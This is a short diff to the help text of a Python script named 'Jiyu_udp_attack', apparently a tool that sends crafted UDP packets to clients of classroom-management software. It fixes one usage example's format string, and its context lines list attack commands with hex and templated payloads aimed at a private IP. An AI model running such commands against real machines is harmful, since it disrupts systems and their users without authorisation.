@@ -92,7 +92,7 @@ if __name__ == "__main__":
         "    python Jiyu_udp_attack -t 192.168.106.100 -n hacker 1000\n"
         "    python Jiyu_udp_attack -t 192.168.106.100 --hex 444d4f43000001002a020000\n"
         '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{rand16.size_2}"\n'
-        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0.little_4}" 1024\n'
+        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024\n'
         '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello\n'
         "    python Jiyu_udp_attack -t 192.168.106.100 --pkg test.txt 1024 hello\n",
         formatter_class=argparse.RawTextHelpFormatter,
